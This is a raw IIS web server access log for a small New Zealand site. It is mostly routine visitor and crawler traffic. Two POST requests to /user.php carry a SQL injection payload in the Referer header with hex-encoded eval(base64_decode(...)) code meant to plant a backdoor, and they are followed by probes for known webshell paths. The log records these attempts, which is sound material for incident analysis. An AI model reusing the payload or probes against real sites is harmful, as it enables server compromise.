#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-10-18 08:09:55
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-10-18 08:09:55 GET / - 52.53.201.78 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_12_6)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/61.0.3163.100+Safari/537.36 - 200 8209 220
2018-10-18 14:49:54 POST /user.php - 118.143.205.118 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) 554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:"id";s:3:"'/*";s:3:"num";s:201:"*/+union+select+1,0x272F2A,3,4,5,6,7,8,0x7b247b24687a6c6c616761275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262614870736247466e595630704f773d3d2729293b2f2f7d7d,0--";s:4:"name";s:3:"ads";}554fcae493e564ee0dc75bdf2ebf94ca 404 1405 1152
2018-10-18 14:49:57 POST /user.php - 118.143.205.118 HTTP/1.1 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) 45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:"num";s:207:"*/+select+1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b24487a6c6c616761275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262534870736247466e595630704f773d3d2729293b2f2f7d7d,0--";s:2:"id";s:9:"'+union/*";s:4:"name";s:3:"ads";}45ea207d7a2b68c49582d2d22adf953a 404 1405 1144
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-10-18 15:12:03
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-10-18 15:12:02 GET / - 118.143.205.118 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz 200 29200 256
2018-10-18 15:12:03 POST /data/cache/asd.php - 118.143.205.118 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/data/cache/asd.php 404 1405 658
2018-10-18 15:12:06 POST /plus/read.php - 118.143.205.118 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/read.php 404 0 648
2018-10-18 15:12:09 POST /plus/result.php - 118.143.205.118 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/result.php 404 1405 655
2018-10-18 15:12:09 POST /plus/moon.php - 118.143.205.118 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/moon.php 404 1405 648
2018-10-18 15:12:11 POST /cm.php - 118.143.205.118 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/cm.php 404 0 636
2018-10-18 15:12:14 POST /plus/90sec.php - 118.143.205.118 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/90sec.php 404 0 654
2018-10-18 15:12:16 POST /config/AspCms_Config.asp - 118.143.205.118 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/config/AspCms_Config.asp 404 1405 1124
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-10-18 16:14:11
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-10-18 16:14:11 GET /robots.txt - 66.249.79.168 HTTP/1.1 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) - 404 1405 237
2018-10-18 16:14:11 GET / - 66.249.79.168 HTTP/1.1 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) - 200 8209 300
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-10-18 19:55:55
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-10-18 19:55:55 GET / - 51.254.101.95 HTTP/1.1 Mozilla/5.0+(Windows+NT+10.0;+rv:61.0)+Gecko/20100101+Firefox/61.0 - 200 8209 291
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-10-19 00:06:32
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-10-19 00:06:32 GET / - 42.236.99.9 HTTP/1.1 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/50.0.2661.102+Safari/537.36;+360Spider http://kaiparatavern.co.nz/ 200 8209 319
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-10-19 05:46:24
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-10-19 05:46:24 GET / - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 https://www.google.co.nz/ 200 8209 419
2018-10-19 05:46:26 GET /css/team.css - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 1027 362
2018-10-19 05:46:26 GET /css/jQuery.lightninBox.css - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 1481 376
2018-10-19 05:46:26 GET /css/font-awesome.min.css - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 8118 374
2018-10-19 05:46:26 GET /css/style.css - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 11722 363
2018-10-19 05:46:27 GET /css/bootstrap.min.css - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 27990 371
2018-10-19 05:46:27 GET /js/modernizr.custom.js - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 4923 357
2018-10-19 05:46:27 GET /js/bootstrap.min.js - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 13266 354
2018-10-19 05:46:27 GET /js/jquery.min.js - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 43185 351
2018-10-19 05:46:27 GET /js/SmoothScroll.min.js - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 3749 357
2018-10-19 05:46:28 GET /js/main.js - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 871 345
2018-10-19 05:46:28 GET /js/cbpFWTabs.js - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 1208 350
2018-10-19 05:46:28 GET /js/boot_slider.js - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 2045 352
2018-10-19 05:46:28 GET /js/jQuery.lightninBox.js - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 3081 359
2018-10-19 05:46:28 GET /fonts/fontawesome-webfont.woff2 - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 404 1405 374
2018-10-19 05:46:28 GET /images/logo.png - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 9464 408
2018-10-19 05:46:29 GET /fonts/fontawesome-webfont.woff - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 404 1405 373
2018-10-19 05:46:30 GET /images/team2.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 920251 409
2018-10-19 05:46:30 GET /images/team1.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 982372 409
2018-10-19 05:46:30 GET /fonts/fontawesome-webfont.ttf - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 152629 372
2018-10-19 05:46:30 GET /images/team4.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 957546 409
2018-10-19 05:46:31 GET /images/work-img1.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 889310 413
2018-10-19 05:46:31 GET /images/team3.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 843003 409
2018-10-19 05:46:31 GET /images/work-img3.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 943143 413
2018-10-19 05:46:31 GET /images/work-img4.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 946466 413
2018-10-19 05:46:32 GET /images/work-img5.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 869467 413
2018-10-19 05:46:32 GET /images/work-img2.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 1001601 413
2018-10-19 05:46:32 GET /images/work-img7.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 1067450 413
2018-10-19 05:46:32 GET /images/work-img6.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 1093416 413
2018-10-19 05:46:32 GET /images/work-img8.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 915658 413
2018-10-19 05:46:32 GET /images/work-img9.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 1018615 413
2018-10-19 05:46:34 GET /images/work-img11.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 891396 414
2018-10-19 05:46:34 GET /images/work-img10.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 968132 414
2018-10-19 05:46:34 GET /images/xtra_logo.png - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 26596 413
2018-10-19 05:46:34 GET /images/info.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 729150 408
2018-10-19 05:46:34 GET /css/images/cd-top-arrow.svg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 404 1405 420
2018-10-19 05:46:34 GET /images/work-img12.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 961465 414
2018-10-19 05:46:34 GET /images/banner2.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 46855 411
2018-10-19 05:46:35 GET /images/banner3.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 448536 411
2018-10-19 05:46:38 GET /images/banner4.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 747680 411
2018-10-19 05:46:41 GET /images/banner5.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 680331 411
2018-10-19 05:46:41 GET /images/banner1.jpg - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 200 553071 411
2018-10-19 05:46:41 GET /favicon.ico - 115.189.88.82 HTTP/1.1 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_0_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1 http://www.kaiparatavern.co.nz/ 404 1405 346
